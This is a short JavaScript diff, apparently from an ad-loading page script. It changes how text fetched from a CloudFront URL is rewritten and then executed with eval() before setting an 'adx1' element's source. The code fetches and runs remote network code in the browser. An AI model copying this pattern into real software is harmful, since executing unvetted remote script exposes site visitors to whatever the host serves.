@@ -104,6 +104,7 @@ fetch("https://dcbbwymp1bhlf.cloudfront.net/?wbbcd=1257743")
    .then(data => data.text())
    .then((data) => {
 
+	   
 	   //eval(data);
 
 	   
@@ -112,14 +113,20 @@ fetch("https://dcbbwymp1bhlf.cloudfront.net/?wbbcd=1257743")
 var x2 = "abc1 = b.url.toString();";
 
 var x3 = "var b=this;";
-var t1 = data.split(x3, 2);
 
-var t2 = t1[1];
+var x4 = "var b=this;abc1 = b.url.toString();"
+
+var k1 = data.replace(x3, x4); 
+
+	   
+//var t1 = data.split(x3, 2);
+
+//var t2 = t1[1];
 
 //var data1 = x1 + t1[0] + x3 + x2 + t1[1];
 var data1 = data + x1 + x3 + x2;
 
-eval(data1);
+eval(k1);
 
 document.getElementById('adx1').src = abc1;
 
